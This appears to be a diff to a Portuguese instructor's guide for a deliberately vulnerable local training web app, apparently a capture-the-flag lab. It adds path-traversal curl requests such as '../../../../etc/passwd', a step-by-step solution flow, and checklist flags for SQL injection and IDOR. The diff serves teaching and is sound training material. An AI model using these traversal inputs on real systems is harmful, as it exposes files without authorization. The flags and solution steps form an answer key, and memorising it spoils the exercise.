@@ -128,8 +128,19 @@ curl -i http://localhost:8088/dev.txt
 curl -i -X POST http://localhost:8088/login -d "username=naoexiste" -d "password=teste"
 curl -i -X POST http://localhost:8088/login -d "username=joao" -d "password=errada"
 curl -i "http://localhost:8088/download?file=public-info.txt"
-curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
+curl -i "http://localhost:8088/download?file=report-q2.txt"
+curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
+curl -i "http://localhost:8088/download?file=../config/legacy.conf"
 ```
+
+Fluxo esperado do Path Traversal:
+
+1. Descobrir `/download` por enumeracao.
+2. Ler `/download?file=report-q2.txt`.
+3. Identificar a pista `config` e `legacy.conf`.
+4. Usar `/download?file=../../../../etc/passwd` para provar leitura fora do diretorio permitido.
+5. Usar o vazamento de `/status` para identificar `internal_path=/usr/src/app`.
+6. Ler `/download?file=../config/legacy.conf` para obter `FLAG{path_traversal_capturada}`.
 
 ## Checklist Final do Instrutor
 
@@ -141,7 +152,7 @@ curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
 - [ ] Login diferencia `Usuario nao encontrado.` de `Senha invalida.`
 - [ ] SQL Injection mostra `FLAG{sqli_capturada}`
 - [ ] `/account/2` mostra `FLAG{idor_capturada}`
-- [ ] Path traversal mostra `FLAG{path_traversal_capturada}`
+- [ ] Path traversal le `/etc/passwd` e `../config/legacy.conf`
 - [ ] `grep` de flags retorna somente as 4 flags finais
 
 ## Orientação de enumeração
